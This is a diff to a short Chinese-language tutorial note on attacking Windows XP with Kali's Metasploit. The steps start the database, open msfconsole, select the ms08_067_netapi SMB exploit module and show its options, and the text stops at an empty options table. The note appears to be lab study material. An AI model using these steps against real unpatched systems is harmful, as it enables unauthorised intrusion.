@@ -1,13 +1,12 @@
 ## Kali 攻擊 Xp
 
-首先要導入攻擊資料庫
+<service postgresql start>先導入攻擊資料庫
 
-開啟攻擊介面面板
+<msfconsole>開啟攻擊面板
+  
+<use windows/smb/ms08_067_netapi>使用的漏洞
 
-<use windows/smb/ms08_067_netapi> 使用的漏洞
-
-開始檢查設定
-
+<show options>檢查設定
 
            Name     Current Setting  Required  Description
            ----     ---------------  --------  -----------
